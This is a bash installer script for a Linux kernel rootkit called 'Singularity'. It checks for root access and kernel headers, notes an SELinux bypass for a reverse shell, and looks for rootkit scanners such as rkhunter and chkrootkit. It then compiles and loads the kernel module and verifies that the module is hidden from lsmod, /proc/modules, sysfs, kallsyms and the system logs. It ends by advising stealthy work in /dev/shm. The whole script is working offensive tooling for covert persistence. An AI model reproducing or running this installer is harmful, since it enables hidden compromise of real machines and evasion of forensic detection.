#!/bin/bash

# This setup.sh is the first version of the singularity installation script

# There will be other versions that will detect if the environment has any type of EDR monitoring and other improvements; this is just the initial testing phase

# Remember, if you are going to test with singularity, change all patterns and names

cd "$(dirname "$0")"

R='\033[0;31m'
G='\033[0;32m'
Y='\033[1;33m'
C='\033[0;36m'
P='\033[0;35m'
W='\033[1;37m'
D='\033[0;90m'
B='\033[1;34m'
N='\033[0m'
BOLD='\033[1m'

clear

echo -e "${C}   ┌────────────────────────────────────────────────────────────────────────────────────────────┐${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   │${W}  ███████╗██╗███╗   ██╗ ██████╗ ██╗   ██╗██╗      █████╗ ██████╗ ██╗████████╗██╗   ██╗      ${C}│${N}"
echo -e "${C}   │${W}  ██╔════╝██║████╗  ██║██╔════╝ ██║   ██║██║     ██╔══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝      ${C}│${N}"
echo -e "${C}   │${W}  ███████╗██║██╔██╗ ██║██║  ███╗██║   ██║██║     ███████║██████╔╝██║   ██║     ╚████╔╝      ${C}│${N}"
echo -e "${C}   │${W}  ╚════██║██║██║╚██╗██║██║   ██║██║   ██║██║     ██╔══██║██╔══██╗██║   ██║      ╚██╔╝       ${C}│${N}"
echo -e "${C}   │${W}  ███████║██║██║ ╚████║╚██████╔╝╚██████╔╝███████╗██║  ██║██║  ██║██║   ██║       ██║        ${C}│${N}"
echo -e "${C}   │${W}  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝   ╚═╝       ╚═╝        ${C}│${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   │${D}                       Shall we give forensics a little work?                               ${C}│${N}"
echo -e "${C}   │${D}                            github.com/MatheuZSecurity                                      ${C}│${N}"
echo -e "${C}   │${N}                                                                                            ${C}│${N}"
echo -e "${C}   └────────────────────────────────────────────────────────────────────────────────────────────┘${N}"

die()  { echo -e "   ${R}✗${N} ${R}$1${N}"; exit 1; }
ok()   { echo -e "   ${G}✓${N} $1"; }
info() { echo -e "   ${B}›${N} $1"; }
warn() { echo -e "   ${Y}!${N} ${Y}$1${N}"; }
skip() { echo -e "   ${D}○ $1${N}"; }

section() {
    echo ""
    echo -e "   ${C}┌──${N} ${BOLD}$1${N}"
    echo -e "   ${C}│${N}"
}

section_end() {
    echo -e "   ${C}└────────────────────────────────────────────────────────${N}"
}

get_memory_kb() {
    grep MemAvailable /proc/meminfo | awk '{print $2}'
}

get_cpu_usage() {
    top -bn1 | grep "Cpu(s)" | awk '{print $2}' | cut -d'%' -f1
}

[[ $EUID -eq 0 ]] || die "Must be run as root"

section "SYSTEM CHECK"

if [[ ! -f "/proc/sys/kernel/modules_disabled" ]]; then
    die "Cannot verify module loading status"
fi

modules_disabled=$(cat /proc/sys/kernel/modules_disabled 2>/dev/null)
if [[ "$modules_disabled" == "1" ]]; then
    die "Module loading is disabled (modules_disabled=1)"
fi
ok "Module loading enabled"

if [[ ! -d "/lib/modules/$(uname -r)/build" ]]; then
    die "Kernel headers not found for $(uname -r)"
fi
ok "Kernel headers found ${D}($(uname -r))${N}"

if ! command -v make &>/dev/null; then
    die "make not found"
fi
ok "make available"

if ! command -v gcc &>/dev/null; then
    die "gcc not found"
fi
ok "gcc available"

section_end

section "SELINUX CHECK"

if command -v getenforce &>/dev/null; then
    selinux_status=$(getenforce 2>/dev/null)
    case "$selinux_status" in
        Enforcing)
            warn "SELinux is ${R}Enforcing${N}"
            info "Rootkit includes SELinux bypass for reverse shell"
            ;;
        Permissive)
            ok "SELinux is ${Y}Permissive${N}"
            ;;
        Disabled)
            ok "SELinux is ${G}Disabled${N}"
            ;;
        *)
            skip "SELinux status unknown"
            ;;
    esac
elif [[ -f "/etc/selinux/config" ]]; then
    ok "SELinux config present but not active"
else
    ok "SELinux not installed"
fi

section_end

section "DETECTION TOOLS"

detected_tools=()

if command -v chkrootkit &>/dev/null; then
    detected_tools+=("chkrootkit")
    warn "chkrootkit detected"
fi

if command -v rkhunter &>/dev/null; then
    detected_tools+=("rkhunter")
    warn "rkhunter detected"
fi

if command -v unhide &>/dev/null; then
    detected_tools+=("unhide")
    warn "unhide detected"
fi

if command -v lynis &>/dev/null; then
    detected_tools+=("lynis")
    warn "lynis detected"
fi

if [[ ${#detected_tools[@]} -eq 0 ]]; then
    ok "No rootkit scanners detected"
else
    echo ""
    info "Singularity hides from: lsmod, /proc/modules, dmesg, kallsyms"
fi

section_end

section "CONNTRACK CHECK"

if command -v conntrack &>/dev/null; then
    conntrack -L &>/dev/null || true
    
    if lsmod | grep -q "nf_conntrack_netlink"; then
        ok "nf_conntrack_netlink ${D}(module)${N}"
    elif [[ -d "/sys/module/nf_conntrack_netlink" ]]; then
        ok "nf_conntrack_netlink ${D}(built-in)${N}"
    else
        modprobe nf_conntrack_netlink 2>/dev/null || true
        conntrack -L &>/dev/null || true
        
        if lsmod | grep -q "nf_conntrack_netlink" || [[ -d "/sys/module/nf_conntrack_netlink" ]]; then
            ok "nf_conntrack_netlink ${D}(loaded)${N}"
        else
            warn "nf_conntrack_netlink not available"
        fi
    fi
else
    warn "conntrack-tools not installed"
    echo ""
    info "These hooks will be installed but won't affect the system without conntrack"
    info "This is ${G}not a critical dependency${N} - installation will continue"
    echo ""
fi

section_end

section "BUILD"

info "Cleaning previous build..."
make clean &>/dev/null || true

info "Compiling..."
if ! make -j$(nproc) &>/dev/null; then
    echo ""
    make -j$(nproc) 2>&1 | tail -10
    die "Compilation failed"
fi
ok "Build successful"

section_end

section "SYSTEM BASELINE"

info "Capturing system state before module load..."
mem_before=$(get_memory_kb)
cpu_before=$(get_cpu_usage)

mem_before_mb=$((mem_before / 1024))
ok "Memory available: ${W}${mem_before_mb} MB${N}"
ok "CPU usage: ${W}${cpu_before}%${N}"

section_end

section "INSTALL"

info "Loading kernel module..."
if ! insmod singularity.ko 2>/dev/null; then
    die "Failed to load module"
fi
ok "Module loaded"

sleep 1

info "Measuring impact..."
mem_after=$(get_memory_kb)
cpu_after=$(get_cpu_usage)

mem_after_mb=$((mem_after / 1024))
mem_diff_kb=$((mem_before - mem_after))
mem_diff_mb=$((mem_diff_kb / 1024))

cpu_before_fixed=$(echo "$cpu_before" | tr ',' '.')
cpu_after_fixed=$(echo "$cpu_after" | tr ',' '.')

if command -v bc &>/dev/null; then
    cpu_diff=$(echo "$cpu_after_fixed - $cpu_before_fixed" | bc 2>/dev/null)
    [[ -z "$cpu_diff" ]] && cpu_diff="0.0"
else
    cpu_diff=$(awk "BEGIN {printf \"%.1f\", $cpu_after_fixed - $cpu_before_fixed}" 2>/dev/null || echo "0.0")
fi

if [[ $mem_diff_kb -lt 0 ]]; then
    mem_diff_kb=$((mem_diff_kb * -1))
    mem_diff_mb=$((mem_diff_kb / 1024))
    ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(+${mem_diff_mb} MB)${N}"
else
    ok "Memory available: ${W}${mem_after_mb} MB${N} ${D}(-${mem_diff_mb} MB)${N}"
fi

ok "CPU usage: ${W}${cpu_after}%${N} ${D}( ${cpu_diff}%)${N}"

mem_abs=$mem_diff_mb
[[ $mem_abs -lt 0 ]] && mem_abs=$((mem_abs * -1))

if [[ $mem_abs -lt 5 ]]; then
    ok "Memory footprint: ${G}Minimal (<5 MB)${N}"
elif [[ $mem_abs -lt 50 ]]; then
    ok "Memory footprint: ${Y}${mem_abs} MB${N}"
else
    warn "Memory footprint: ${R}${mem_abs} MB (HIGH)${N}"
fi

section_end

sleep 0.5

section "VERIFICATION"

pass=0
fail=0

if lsmod | grep -q "^singularity"; then
    warn "lsmod shows module"
    ((fail++))
else
    ok "lsmod ${D}(hidden)${N}"
    ((pass++))
fi

if grep -q "^singularity" /proc/modules 2>/dev/null; then
    warn "/proc/modules shows module"
    ((fail++))
else
    ok "/proc/modules ${D}(hidden)${N}"
    ((pass++))
fi

if [[ -d "/sys/module/singularity" ]]; then
    warn "/sys/module/singularity exists"
    ((fail++))
else
    ok "/sys/module/ ${D}(hidden)${N}"
    ((pass++))
fi

if [[ -f "/proc/sys/kernel/tainted" ]]; then
    taint_value=$(cat /proc/sys/kernel/tainted 2>/dev/null)
    if [[ "$taint_value" != "0" ]]; then
        warn "Kernel tainted (value: $taint_value)"
        ((fail++))
    else
        ok "Kernel taint ${D}(clean)${N}"
        ((pass++))
    fi
fi

log_exposed=0

if dmesg 2>/dev/null | grep -qi "singularity\|taint"; then
    ((log_exposed++))
fi

if command -v journalctl &>/dev/null; then
    if journalctl -k --no-pager 2>/dev/null | grep -qi "singularity\|taint"; then
        ((log_exposed++))
    fi
fi

if [[ -f "/var/log/kern.log" ]]; then
    if tail -50 /var/log/kern.log 2>/dev/null | grep -qi "singularity\|taint"; then
        ((log_exposed++))
    fi
fi

if [[ -f "/var/log/syslog" ]]; then
    if tail -50 /var/log/syslog 2>/dev/null | grep -qi "singularity\|taint"; then
        ((log_exposed++))
    fi
fi

if [[ $log_exposed -gt 0 ]]; then
    warn "Logs contain traces ${D}($log_exposed sources)${N}"
    ((fail++))
else
    ok "Logs clean ${D}(dmesg, journalctl, kern.log, syslog)${N}"
    ((pass++))
fi

if grep -qi "singularity" /proc/kallsyms 2>/dev/null; then
    warn "kallsyms shows module symbols"
    ((fail++))
else
    ok "kallsyms ${D}(hidden)${N}"
    ((pass++))
fi

section_end

echo ""
echo -e "${C}   ┌─────────────────────────────────────────────────────────────┐${N}"
if [[ $fail -eq 0 ]]; then
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Work in /dev/shm or /run for more stealth               ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Logs and traces filtered                                 ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
else
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}            ${W}Tests:${N} ${G}$pass passed${N}  ${R}$fail failed${N}                     ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Work in /dev/shm or /run for more stealth               ${C}│${N}"
    echo -e "${C}   │${N}   ${D}▸${N} Logs and traces filtered                                 ${C}│${N}"
    echo -e "${C}   │${N}                                                             ${C}│${N}"
fi
echo -e "${C}   └─────────────────────────────────────────────────────────────┘${N}"
echo ""

if [[ ${#detected_tools[@]} -gt 0 ]]; then
    echo -e "${Y}     NOTE: Rootkit scanner(s) present: ${detected_tools[*]}, but singularity easily bypass these tools.${N}"
    echo ""
fi
